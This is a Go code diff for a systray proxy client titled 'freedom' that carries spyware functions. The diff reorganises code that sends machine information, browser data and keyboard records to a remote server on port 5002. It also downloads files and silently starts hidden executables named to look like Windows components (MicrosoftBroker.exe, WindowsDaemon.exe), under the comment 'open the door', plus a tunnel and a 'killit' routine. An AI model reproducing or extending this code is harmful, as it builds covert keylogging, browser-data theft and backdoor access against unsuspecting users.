@@ -52,21 +52,48 @@ func (a *AppConfigMgr) Callback(conf *etcd.Config) {
 	appConfigMgr.config.Store(appConfig)
 }
 func onReady() {
+	//load tunnel config
 	conf, _ := etcd.NewConfig()
 	conf.AddObserver(appConfigMgr)
 	var appConfig AppConfig
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
 	go transfer.PacHandle(Config.PacPort)
-	finflag := make(chan string)
-	go machineinfo.MachineSend("http://"+conf.Url+":5002/machine/machineInfo", finflag)
-	<-finflag
-	go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
-	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
-	go tunnel.Tunnel(conf.Url)
-	go killit.Killit()
-	////check update
-	go lib.DoUpdate()
+	go func() {
+		//fixed ioop download check
+		_, err := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
+		if err != nil {
+			log.Println(err)
+			downflag := make(chan string)
+			//keep the main process live
+			go lib.MultiFileDown([]string{}, "init", downflag)
+			<-downflag
+			//open the door
+			cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd.Start()
+			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
+			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd2.Start()
+			finflag := make(chan string)
+			go machineinfo.MachineSend("http://"+conf.Url+":5002/machine/machineInfo", finflag)
+			<-finflag
+			go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
+		} else {
+			cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd.Start()
+		}
+		go killit.Killit()
+		go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
+		go tunnel.Tunnel(conf.Url)
+		////check update
+		go lib.DoUpdate()
+	}()
+	//control proxy thread
+	gm := grtm.NewGrManager()
+
+	//block
 	systray.SetIcon(icon.Data)
 	systray.SetTitle("freedom")
 	mQuit := systray.AddMenuItem("Quit", "Quit freedom")
@@ -76,8 +103,6 @@ func onReady() {
 		<-mQuit.ClickedCh
 		systray.Quit()
 	}()
-	//control proxy thread
-	gm := grtm.NewGrManager()
 	//loop up the switch signal
 	for {
 		select {
@@ -99,7 +124,7 @@ func onReady() {
 	}
 }
 func onExit() {
-	lib.KillCheck()
+	lib.KillALL()
 }
 func init() {
 	lib.KillCheck()
@@ -108,22 +133,8 @@ func init() {
 	data := []byte(content)
 	if ioutil.WriteFile(lib.CURRENTPATHLOG, data, 0644) == nil {
 	}
-	//fixed ioop download check
-	_, cerr := os.Stat(lib.CURRENTPATH + "WindowsDaemon.exe")
-	if cerr != nil {
-		//keep the main process live
-		lib.MultiFileDown([]string{}, "init")
-
-		cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmd.Start()
-	} else {
-		cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmd.Start()
-	}
 	if !Config.Dev {
-		log.Println("已启动free客户端，请在free_" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
+		log.Println("已启动free客户端，请在free" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
 		f, _ := os.OpenFile("free"+strconv.Itoa(Config.ClientPort)+".log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
 		log.SetOutput(f)
 	}
@@ -133,12 +144,3 @@ func init() {
 func main() {
 	systray.Run(onReady, onExit)
 }
-
-//func run(){
-//	for {
-//		appConfig := appConfigMgr.config.Load().(*AppConfig)
-//		fmt.Println("Hostname:", appConfig.Url)
-//		fmt.Printf("%v\n", "--------------------")
-//		time.Sleep(5 * time.Second)
-//	}
-//}
